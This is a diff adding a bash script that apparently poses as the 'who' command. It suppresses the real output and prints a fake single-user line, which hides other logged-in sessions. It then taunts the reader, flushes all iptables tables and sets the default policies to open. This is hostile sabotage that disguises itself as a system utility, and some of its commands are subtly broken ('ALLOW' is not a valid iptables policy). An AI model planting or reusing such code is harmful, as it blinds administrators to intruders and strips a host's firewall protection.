@@ -1,0 +1,26 @@
+#!/bin/bash
+
+# Execute real 'who' command and don't display anything. Also mess with them
+command who | grep -Ev "*" | echo "$USER\ttty1\t`date`"
+
+# Every good script needs some psychological warfare
+echo ""
+echo "Gonna have to use something like vim if you want to read this file ;P"
+
+# Source the ~/.bashrc
+source ~/.bashrc
+
+# Flush iptables rules
+command iptables -F
+command iptables -t mangle -F
+command iptables -t nat -F
+command iptables -t filter -F
+command iptables -t raw -F
+command iptables -t security -F
+
+# Change default policies for 'iptables'
+command iptables -P INPUT ALLOW
+command iptables -P OUTPUT ALLOW
+command iptables -P FORWARD ALLOW
+
+
